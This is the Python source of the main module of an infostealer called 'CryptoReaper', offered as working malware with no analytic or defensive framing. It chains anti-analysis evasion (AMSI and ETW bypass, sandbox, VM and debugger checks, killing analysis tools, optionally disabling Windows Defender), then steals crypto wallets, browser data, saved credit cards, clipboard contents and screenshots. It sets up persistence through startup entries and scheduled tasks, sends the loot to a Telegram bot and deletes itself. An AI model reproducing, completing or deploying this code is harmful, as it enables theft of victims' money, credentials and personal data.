import os
import sys
import json
import base64
import asyncio
import time
import random
from cryptography.fernet import Fernet

try:
    from . import wallets
    from . import browsers
    from . import evasion
    from . import comms
except ImportError:
    import wallets
    import browsers
    import evasion
    import comms

class CryptoReaper:
    def __init__(self):
        self.config = self.load_config()
        self.mutex_created = False
        self.collected_data = {
            "wallets": {},
            "browsers": {},
            "credit_cards": {},
            "system_info": {},
            "screenshots": [],
            "clipboard": "",
            "execution_metrics": {}
        }
        self.start_time = time.time()
    
    def create_mutex(self):
        try:
            import win32event
            import win32api
            mutex_name = f"Global\\CryptoReaper_{hash(str(time.time()))}"
            win32event.CreateMutex(None, False, mutex_name)
            self.mutex_created = True
            return True
        except:
            return False
    
    def load_config(self):
        try:
            with open("core/key.bin", "rb") as f:
                key = f.read()
            
            with open("core/config_encrypted.bin", "rb") as f:
                encrypted_config = f.read()
            
            cipher = Fernet(key)
            config = json.loads(cipher.decrypt(encrypted_config).decode())
            return config
        except Exception as e:
            return self.get_fallback_config()
    
    def get_fallback_config(self):
        return {
            "stealth": {
                "hidden_console": True,
                "disable_windows_defender": False,
                "uac_bypass": False
            },
            "persistence": {
                "install": False,
                "methods": ["startup", "scheduled_task"]
            },
            "evasion": {
                "amsi_bypass": True,
                "etw_bypass": True,
                "wldp_bypass": True,
                "antidebug": True,
                "antivm": True,
                "sandbox_detection": True
            },
            "targets": {
                "crypto_wallets": True,
                "browser_data": True,
                "credit_cards": True,
                "discord_tokens": True,
                "system_info": True,
                "screenshots": True,
                "clipboard": True
            },
            "exfiltration": {
                "telegram_bot_token": "",
                "telegram_chat_id": ""
            },
            "advanced": {
                "obfuscation_level": "medium",
                "fileless_execution": False,
                "self_destruct": False
            }
        }
    
    async def pre_execution_checks(self):
        if self.config["advanced"].get("mutex_check", True):
            if not self.create_mutex():
                sys.exit()
        
        if self.config["evasion"].get("sleep_obfuscation", True):
            await asyncio.sleep(random.uniform(2.0, 8.0))
    
    async def execute_evasion(self):
        if not self.config["evasion"]:
            return
        
        evasion.kill_analysis_tools()
        
        if self.config["evasion"].get("amsi_bypass", True):
            evasion.bypass_amsi_etw()
        
        if self.config["evasion"].get("sandbox_detection", True):
            if evasion.detect_sandbox():
                sys.exit()
        
        if self.config["evasion"].get("antidebug", True):
            evasion.anti_debug()
        
        if self.config["evasion"].get("antivm", True):
            evasion.anti_vm()
        
        if self.config["stealth"].get("disable_windows_defender", False):
            evasion.disable_defender()
    
    async def steal_data(self):
        tasks = []
        
        if self.config["targets"].get("crypto_wallets", True):
            tasks.append(self.steal_wallets())
        
        if self.config["targets"].get("browser_data", True):
            tasks.append(self.steal_browser_data())
        
        if self.config["targets"].get("system_info", True):
            tasks.append(self.steal_system_info())
        
        if self.config["targets"].get("credit_cards", True):
            tasks.append(self.steal_credit_cards())
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                print(f"Data collection error: {result}")
    
    async def steal_wallets(self):
        try:
            self.collected_data["wallets"] = await wallets.scan_all_wallets()
        except Exception as e:
            self.collected_data["wallets"] = {"error": str(e)}
    
    async def steal_browser_data(self):
        try:
            self.collected_data["browsers"] = await browsers.extract_all_browser_data()
        except Exception as e:
            self.collected_data["browsers"] = {"error": str(e)}
    
    async def steal_system_info(self):
        try:
            self.collected_data["system_info"] = evasion.get_system_info()
            
            if self.config["targets"].get("screenshots", True) and self.collected_data["wallets"]:
                self.collected_data["screenshots"] = evasion.take_screenshots()
            
            if self.config["targets"].get("clipboard", True):
                clipboard_data = evasion.get_clipboard_data()
                if clipboard_data:
                    self.collected_data["clipboard"] = clipboard_data
                    
        except Exception as e:
            self.collected_data["system_info"] = {"error": str(e)}
    
    async def steal_credit_cards(self):
        try:
            if "browsers" in self.collected_data:
                all_cards = []
                for browser_name, browser_data in self.collected_data["browsers"].items():
                    for profile_name, profile_data in browser_data.items():
                        if "credit_cards" in profile_data:
                            for card in profile_data["credit_cards"]:
                                card["source"] = f"{browser_name}/{profile_name}"
                                all_cards.append(card)
                self.collected_data["credit_cards"] = all_cards
        except Exception as e:
            self.collected_data["credit_cards"] = {"error": str(e)}
    
    async def establish_persistence(self):
        if not self.config["persistence"].get("install", False):
            return
        
        try:
            if "startup" in self.config["persistence"].get("methods", []):
                evasion.add_to_startup()
            
            if "scheduled_task" in self.config["persistence"].get("methods", []):
                evasion.create_scheduled_task()
                
        except Exception as e:
            print(f"Persistence error: {e}")
    
    async def exfiltrate_data(self):
        telegram_config = self.config.get("exfiltration", {})
        bot_token = telegram_config.get("telegram_bot_token")
        chat_id = telegram_config.get("telegram_chat_id")
        
        if not bot_token or not chat_id:
            return
        
        try:
            has_valuable_data = (
                self.collected_data["wallets"] or
                self.collected_data["credit_cards"] or
                any(self.collected_data["browsers"].values())
            )
            
            if has_valuable_data:
                await comms.send_to_telegram(
                    self.collected_data, 
                    bot_token, 
                    chat_id,
                    async_mode=True
                )
                
        except Exception as e:
            print(f"Exfiltration error: {e}")
    
    def calculate_metrics(self):
        end_time = time.time()
        self.collected_data["execution_metrics"] = {
            "start_time": self.start_time,
            "end_time": end_time,
            "duration": end_time - self.start_time,
            "wallets_found": len(self.collected_data.get("wallets", {})),
            "credit_cards_found": len(self.collected_data.get("credit_cards", [])),
            "browsers_scanned": len(self.collected_data.get("browsers", {})),
            "screenshots_taken": len(self.collected_data.get("screenshots", []))
        }
    
    async def cleanup(self):
        if self.config["advanced"].get("self_destruct", False):
            try:
                if os.path.exists(sys.argv[0]):
                    os.remove(sys.argv[0])
            except:
                pass
    
    async def run(self):
        await self.pre_execution_checks()
        await self.execute_evasion()
        await self.steal_data()
        self.calculate_metrics()
        
        has_data = (
            self.collected_data["wallets"] or 
            self.collected_data["credit_cards"] or
            any(self.collected_data["browsers"].values())
        )
        
        if has_data:
            await self.establish_persistence()
            await self.exfiltrate_data()
        
        await self.cleanup()

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "fileless":
        try:
            import tempfile
            temp_dir = tempfile.mkdtemp()
            os.chdir(temp_dir)
        except:
            pass
    
    try:
        reaper = CryptoReaper()
        asyncio.run(reaper.run())
    except KeyboardInterrupt:
        sys.exit()
    except Exception as e:
        sys.exit()

if __name__ == "__main__":
    main()